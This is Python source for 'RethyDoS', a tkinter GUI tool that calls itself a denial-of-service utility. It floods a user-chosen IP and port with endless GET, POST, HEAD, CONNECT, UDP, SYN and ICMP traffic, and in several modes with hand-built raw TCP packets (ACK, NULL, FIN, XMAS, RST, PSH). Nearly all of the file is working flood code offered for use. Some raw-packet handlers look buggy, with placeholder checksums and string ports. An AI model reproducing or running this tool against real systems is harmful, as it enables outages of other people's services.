import tkinter as tk
import os
import threading
import webbrowser
import socket
from datetime import datetime

WINDOW_TITLE = "RethyDoS"
WINDOW_DESC = "A denial of service utility."

WINDOW_WIDTH = 400
WINDOW_HEIGHT = 380

ICON_PATH = "RethyDoS.png"

class NetworkTool:
    def __init__(self, master):
        self.master = master
        self.master.title(WINDOW_TITLE)
        if os.path.isfile(ICON_PATH):
            self.master.iconphoto(True, tk.PhotoImage(file=ICON_PATH))
        self.master.resizable(False, False)
        
        # Instead of overrideredirect, use these styles for borderless with taskbar
        self.master.attributes('-alpha', 1.0)
        self.master.attributes('-transparentcolor', 'grey')
        self.master.configure(background='grey')
        
        self.window_width = WINDOW_WIDTH
        self.window_height = WINDOW_HEIGHT
        self.border_size = 1

        # Variables for window dragging
        self.drag_data = {"x": 0, "y": 0}

        screen_width = self.master.winfo_screenwidth()
        screen_height = self.master.winfo_screenheight()
        x = int((screen_width - self.window_width - 2*self.border_size) / 2)
        y = int((screen_height - self.window_height - 2*self.border_size) / 2)

        self.master.geometry(f"{self.window_width + 2*self.border_size}x{self.window_height + 2*self.border_size}+{x}+{y}")
        self.master.configure(background='lightgrey')

        self.content_frame = tk.Frame(self.master, background='black')
        self.content_frame.pack(padx=self.border_size, pady=self.border_size)

        self.canvas = tk.Canvas(self.content_frame, width=self.window_width, height=self.window_height, bg='black', highlightthickness=0)
        self.canvas.pack()

        # Bind mouse events for window dragging
        self.canvas.bind("<Button-1>", self.start_drag)
        self.canvas.bind("<B1-Motion>", self.on_drag)

        # Add rethy.xyz logo with click handler
        self.logo_text = self.canvas.create_text(200, 30, text="rethy.xyz", font="Helvetica 22 italic", fill="white")
        self.canvas.tag_bind(self.logo_text, "<Button-1>", lambda _: self.open_rethy_website())

        self.ip_label = tk.Label(self.content_frame, text="IP Address:", fg="white", bg="black")
        self.ip_label.place(x=50, y=70)
        self.ip_entry = tk.Entry(self.content_frame, fg="white", bg="black")
        self.ip_entry.place(x=150, y=70, width=180)

        self.port_label = tk.Label(self.content_frame, text="Port:", fg="white", bg="black")
        self.port_label.place(x=50, y=100)
        self.port_entry = tk.Entry(self.content_frame, fg="white", bg="black")
        self.port_entry.place(x=150, y=100, width=180)

        self.request_type_label = tk.Label(self.content_frame, text="Request Type:", fg="white", bg="black")
        self.request_type_label.place(x=50, y=130)
        self.request_type = tk.StringVar(self.content_frame)
        self.request_type.set("GET")
        self.request_type_dropdown = tk.OptionMenu(self.content_frame, self.request_type, 
            "GET", "POST", "UDP", "SYN", "SYN-ACK", "ICMP", "HTTP-HEAD", 
            "HTTP-CONNECT", "ACK", "NULL", "FIN", "XMAS", "RST", "PUSH"
        )
        self.request_type_dropdown.place(x=150, y=130)

        self.button_text = tk.StringVar(value="Start")
        self.start_stop_button = tk.Button(self.content_frame, textvariable=self.button_text, fg="white", bg="green", command=self.start_stop_request)
        self.start_stop_button.place(x=184, y=180)

        # Adjusted spacing between elements
        self.project_name = self.canvas.create_text(200, 230, text=WINDOW_TITLE, font="Helvetica 12", fill="white")
        self.canvas.tag_bind(self.project_name, "<Button-1>", lambda _: self.open_project_website())
        self.project_description = self.canvas.create_text(200, 250, text=f"{WINDOW_DESC}", font="Tahoma 9 italic", fill="white")
        self.copyright_note = self.canvas.create_text(200, 270, text="2024 © Brody Rethy", font="Helvetica 10", fill="white")

        # Enhanced logging setup - moved down for better spacing
        log_frame = tk.Frame(self.content_frame, bg='black')
        log_frame.place(x=10, y=290, width=380, height=46)

        scrollbar = tk.Scrollbar(log_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        self.log_text = tk.Text(log_frame, height=4, bg='black', fg='white', font=('Courier', 8), yscrollcommand=scrollbar.set, wrap=tk.WORD)
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=2)

        scrollbar.config(command=self.log_text.yview)

        # Add close button below log
        self.close_button = tk.Button(self.content_frame, text="×", fg="white", bg="red", command=self.master.destroy, font=("Arial", 10, "bold"))
        self.close_button.place(x=184, y=345)

        self.is_running = False
        self.request_thread = None

    def start_drag(self, event):
        self.drag_data["x"] = event.x
        self.drag_data["y"] = event.y

    def on_drag(self, event):
        # Calculate the distance moved
        dx = event.x - self.drag_data["x"]
        dy = event.y - self.drag_data["y"]
        
        # Get the current window position
        x = self.master.winfo_x() + dx
        y = self.master.winfo_y() + dy
        
        # Move the window
        self.master.geometry(f"+{x}+{y}")

    def log_message(self, message):
        timestamp = datetime.now().strftime("[%H:%M:%S]")
        formatted_message = f"{timestamp} {message}"  # Removed the \n here
        if self.log_text.get(1.0, tk.END).strip():  # If log is not empty
            formatted_message = "\n" + formatted_message  # Add newline before message
        self.log_text.insert(tk.END, formatted_message)
        self.log_text.see(tk.END)  # Auto-scroll to the bottom
        # Keep only last 100 lines
        lines = int(self.log_text.index('end-1c').split('.')[0])
        if lines > 100:
            self.log_text.delete('1.0', '2.0')

    def start_stop_request(self):
        if not self.is_running:
            ip = self.ip_entry.get().strip()
            port = self.port_entry.get().strip()
            
            # Validation
            if not ip and not port:
                self.master.after(0, self.log_message, "Error: IP Address and Port are mandatory fields")
                return
            elif not ip:
                self.master.after(0, self.log_message, "Error: IP Address is a mandatory field")
                return
            elif not port:
                self.master.after(0, self.log_message, "Error: Port is a mandatory field")
                return
                
            request_type = self.request_type.get()
            self.master.after(0, self.log_message, f"Starting {request_type} request to {ip}:{port}")
            self.is_running = True
            self.button_text.set("Stop")
            self.request_thread = threading.Thread(target=self.start_request, args=(request_type, ip, port))
            self.request_thread.daemon = True  # Make thread daemon so it exits when main program exits
            self.request_thread.start()
        else:
            self.master.after(0, self.log_message, "Stopping request")
            self.is_running = False
            self.button_text.set("Start")

    def start_request(self, request_type, ip, port):
        while self.is_running:
            try:
                if request_type == "GET": self.do_get_request(ip, port)
                elif request_type == "POST": self.do_post_request(ip, port)
                elif request_type == "UDP": self.do_udp_request(ip, port)
                elif request_type == "SYN": self.do_syn_request(ip, port)
                elif request_type == "SYN-ACK": self.do_syn_ack_request(ip, port)
                elif request_type == "ICMP": self.do_icmp_request(ip, port)
                elif request_type == "HTTP-HEAD": self.do_head_request(ip, port)
                elif request_type == "HTTP-CONNECT": self.do_connect_request(ip, port)
                elif request_type == "ACK": self.do_ack_request(ip, port)
                elif request_type == "NULL": self.do_null_request(ip, port)
                elif request_type == "FIN": self.do_fin_request(ip, port)
                elif request_type == "XMAS": self.do_xmas_request(ip, port)
                elif request_type == "RST": self.do_rst_request(ip, port)
                elif request_type == "PUSH": self.do_push_request(ip, port)
            except Exception as e:
                self.master.after(0, self.log_message, f"Error: {e}")
                continue

    def do_get_request(self, ip, port):
            while self.is_running:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(0)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                try:
                    sock.connect_ex((ip, int(port)))
                    request = b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n"
                    try:
                        sock.send(request)
                    except:
                        pass
                    self.master.after(0, self.log_message, "GET request sent")
                except:
                    pass
                finally:
                    try:
                        sock.close()
                    except:
                        pass

    def do_post_request(self, ip, port):
        while self.is_running:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setblocking(0)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                sock.connect_ex((ip, int(port)))
                post_data = "data=test"
                request = (
                    f"POST / HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(post_data)}\r\n"
                    f"\r\n"
                    f"{post_data}"
                ).encode()
                try:
                    sock.send(request)
                except:
                    pass
                self.master.after(0, self.log_message, "POST request sent")
            except:
                pass
            finally:
                try:
                    sock.close()
                except:
                    pass

    def do_udp_request(self, ip, port):
        while self.is_running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.settimeout(0.0001)  # Minimal timeout
                    # Set non-blocking mode
                    s.setblocking(0)
                    message = b"rethydos UDP message"
                    s.sendto(message, (ip, int(port)))
                    self.master.after(0, self.log_message, "UDP packet sent")
            except Exception as e:
                self.master.after(0, self.log_message, f"UDP request failed: {e}")

    def do_syn_request(self, ip, port):
        while self.is_running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.0001)  # Minimal timeout
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.setblocking(0)
                    try:
                        s.connect_ex((ip, int(port)))
                        self.master.after(0, self.log_message, f"SYN packet sent to {ip}:{port}")
                    except:
                        pass
            except Exception as e:
                self.master.after(0, self.log_message, f"SYN request failed: {e}")

    def do_syn_ack_request(self, ip, port):
        port = int(port)
        while self.is_running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.setblocking(0)
                    tcp_header = bytearray([
                        0x00, 0x50,  # Source port (80)
                        (port >> 8) & 0xFF, port & 0xFF,  # Destination port
                        0x00, 0x00, 0x00, 0x01,  # Sequence number
                        0x00, 0x00, 0x00, 0x00,  # Acknowledgement number
                        0x50,  # Data offset (5 words = 20 bytes)
                        0x12,  # Flags (SYN-ACK)
                        0x16, 0xd0,  # Window size
                        0x00, 0x00,  # Checksum (placeholder)
                        0x00, 0x00   # Urgent pointer
                    ])
                    try:
                        s.sendto(tcp_header, (ip, int(port)))
                        self.master.after(0, self.log_message, f"SYN-ACK packet sent to {ip}:{port}")
                    except:
                        pass
            except Exception as e:
                self.master.after(0, self.log_message, f"SYN-ACK request failed: {e}")

    def do_icmp_request(self, ip, port):
            while self.is_running:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
                        s.setblocking(0)
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        # ICMP Echo Request
                        icmp_header = bytearray([
                            0x08, 0x00,  # Type: 8 (Echo Request), Code: 0
                            0x00, 0x00,  # Checksum (placeholder)
                            0x00, 0x00,  # Identifier
                            0x00, 0x00   # Sequence Number
                        ])
                        try:
                            s.sendto(icmp_header, (ip, 0))  # ICMP doesn't use ports
                            self.master.after(0, self.log_message, "ICMP packet sent")
                        except:
                            pass
                except Exception as e:
                    self.master.after(0, self.log_message, f"ICMP request failed: {e}")

    def do_head_request(self, ip, port):
        while self.is_running:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setblocking(0)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                sock.connect_ex((ip, int(port)))
                request = b"HEAD / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n"
                try:
                    sock.send(request)
                except:
                    pass
                self.master.after(0, self.log_message, "HEAD request sent")
            except:
                pass
            finally:
                try:
                    sock.close()
                except:
                    pass

    def do_connect_request(self, ip, port):
        while self.is_running:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setblocking(0)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                sock.connect_ex((ip, int(port)))
                request = b"CONNECT " + ip.encode() + b":" + str(port).encode() + b" HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n"
                try:
                    sock.send(request)
                except:
                    pass
                self.master.after(0, self.log_message, "CONNECT request sent")
            except:
                pass
            finally:
                try:
                    sock.close()
                except:
                    pass

    def do_ack_request(self, ip, port):
        while self.is_running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.setblocking(0)
                    tcp_header = bytearray([
                        0x00, 0x50,  # Source port (80)
                        (port >> 8) & 0xFF, port & 0xFF,  # Destination port
                        0x00, 0x00, 0x00, 0x01,  # Sequence number
                        0x00, 0x00, 0x00, 0x00,  # Acknowledgement number
                        0x50,  # Data offset (5 words = 20 bytes)
                        0x10,  # Flags (ACK)
                        0x16, 0xd0,  # Window size
                        0x00, 0x00,  # Checksum (placeholder)
                        0x00, 0x00   # Urgent pointer
                    ])
                    try:
                        s.sendto(tcp_header, (ip, int(port)))
                        self.master.after(0, self.log_message, "ACK packet sent")
                    except:
                        pass
            except Exception as e:
                self.master.after(0, self.log_message, f"ACK request failed: {e}")

    def do_null_request(self, ip, port):
        while self.is_running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.setblocking(0)
                    tcp_header = bytearray([
                        0x00, 0x50,  # Source port (80)
                        (port >> 8) & 0xFF, port & 0xFF,  # Destination port
                        0x00, 0x00, 0x00, 0x01,  # Sequence number
                        0x00, 0x00, 0x00, 0x00,  # Acknowledgement number
                        0x50,  # Data offset (5 words = 20 bytes)
                        0x00,  # Flags (NULL - no flags set)
                        0x16, 0xd0,  # Window size
                        0x00, 0x00,  # Checksum (placeholder)
                        0x00, 0x00   # Urgent pointer
                    ])
                    try:
                        s.sendto(tcp_header, (ip, int(port)))
                        self.master.after(0, self.log_message, "NULL packet sent")
                    except:
                        pass
            except Exception as e:
                self.master.after(0, self.log_message, f"NULL request failed: {e}")

    def do_fin_request(self, ip, port):
        while self.is_running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.setblocking(0)
                    tcp_header = bytearray([
                        0x00, 0x50,  # Source port (80)
                        (port >> 8) & 0xFF, port & 0xFF,  # Destination port
                        0x00, 0x00, 0x00, 0x01,  # Sequence number
                        0x00, 0x00, 0x00, 0x00,  # Acknowledgement number
                        0x50,  # Data offset (5 words = 20 bytes)
                        0x01,  # Flags (FIN)
                        0x16, 0xd0,  # Window size
                        0x00, 0x00,  # Checksum (placeholder)
                        0x00, 0x00   # Urgent pointer
                    ])
                    try:
                        s.sendto(tcp_header, (ip, int(port)))
                        self.master.after(0, self.log_message, "FIN packet sent")
                    except:
                        pass
            except Exception as e:
                self.master.after(0, self.log_message, f"FIN request failed: {e}")

    def do_xmas_request(self, ip, port):
        while self.is_running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.setblocking(0)
                    tcp_header = bytearray([
                        0x00, 0x50,  # Source port (80)
                        (port >> 8) & 0xFF, port & 0xFF,  # Destination port
                        0x00, 0x00, 0x00, 0x01,  # Sequence number
                        0x00, 0x00, 0x00, 0x00,  # Acknowledgement number
                        0x50,  # Data offset (5 words = 20 bytes)
                        0x29,  # Flags (FIN, URG, PSH)
                        0x16, 0xd0,  # Window size
                        0x00, 0x00,  # Checksum (placeholder)
                        0x00, 0x00   # Urgent pointer
                    ])
                    try:
                        s.sendto(tcp_header, (ip, int(port)))
                        self.master.after(0, self.log_message, "XMAS packet sent")
                    except:
                        pass
            except Exception as e:
                self.master.after(0, self.log_message, f"XMAS request failed: {e}")

    def do_rst_request(self, ip, port):
        while self.is_running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.setblocking(0)
                    tcp_header = bytearray([
                        0x00, 0x50,  # Source port (80)
                        (port >> 8) & 0xFF, port & 0xFF,  # Destination port
                        0x00, 0x00, 0x00, 0x01,  # Sequence number
                        0x00, 0x00, 0x00, 0x00,  # Acknowledgement number
                        0x50,  # Data offset (5 words = 20 bytes)
                        0x04,  # Flags (RST)
                        0x16, 0xd0,  # Window size
                        0x00, 0x00,  # Checksum (placeholder)
                        0x00, 0x00   # Urgent pointer
                    ])
                    try:
                        s.sendto(tcp_header, (ip, int(port)))
                        self.master.after(0, self.log_message, "RST packet sent")
                    except:
                        pass
            except Exception as e:
                self.master.after(0, self.log_message, f"RST request failed: {e}")

    def do_push_request(self, ip, port):
        while self.is_running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.setblocking(0)
                    tcp_header = bytearray([
                        0x00, 0x50,  # Source port (80)
                        (port >> 8) & 0xFF, port & 0xFF,  # Destination port
                        0x00, 0x00, 0x00, 0x01,  # Sequence number
                        0x00, 0x00, 0x00, 0x00,  # Acknowledgement number
                        0x50,  # Data offset (5 words = 20 bytes)
                        0x08,  # Flags (PSH)
                        0x16, 0xd0,  # Window size
                        0x00, 0x00,  # Checksum (placeholder)
                        0x00, 0x00   # Urgent pointer
                    ])
                    try:
                        s.sendto(tcp_header, (ip, int(port)))
                        self.master.after(0, self.log_message, "PUSH packet sent")
                    except:
                        pass
            except Exception as e:
                self.master.after(0, self.log_message, f"PUSH request failed: {e}")

    def open_rethy_website(self):
        webbrowser.open("https://rethy.xyz")

    def open_project_website(self):
        webbrowser.open("https://rethy.xyz/Software/rethydos/")

def main():
    root = tk.Tk()
    app = NetworkTool(root)
    root.mainloop()

if __name__ == "__main__":
    main()